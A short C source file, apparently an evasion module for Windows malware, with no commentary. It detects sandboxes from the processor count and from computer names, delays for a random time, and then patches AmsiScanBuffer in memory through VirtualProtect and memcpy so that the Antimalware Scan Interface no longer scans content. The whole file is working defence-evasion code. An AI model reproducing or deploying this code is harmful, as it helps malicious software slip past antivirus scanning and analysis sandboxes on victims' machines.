#include "evasio.h"
#include <intrin.h>
#include <tlhelp32.h>
#include <string.h>

static bool is_sandbox() {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return true;

    char comp[256];
    DWORD sz = sizeof(comp);
    GetComputerNameA(comp, &sz);
    if (strstr(comp, "VIRTUAL") || strstr(comp, "SANDBOX")) return true;

    return false;
}

bool run_evasion() {
    if (is_sandbox()) return false;

    DWORD delayMs = 2000 + (GetTickCount() % 3000);
    Sleep(delayMs);

    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return true;

    FARPROC scanBuf = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!scanBuf) return true;

    DWORD oldProtect;
    unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

    if (VirtualProtect((LPVOID)scanBuf, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        memcpy((void*)scanBuf, patch, sizeof(patch));
        VirtualProtect((LPVOID)scanBuf, sizeof(patch), oldProtect, &oldProtect);
    }

    return true;
}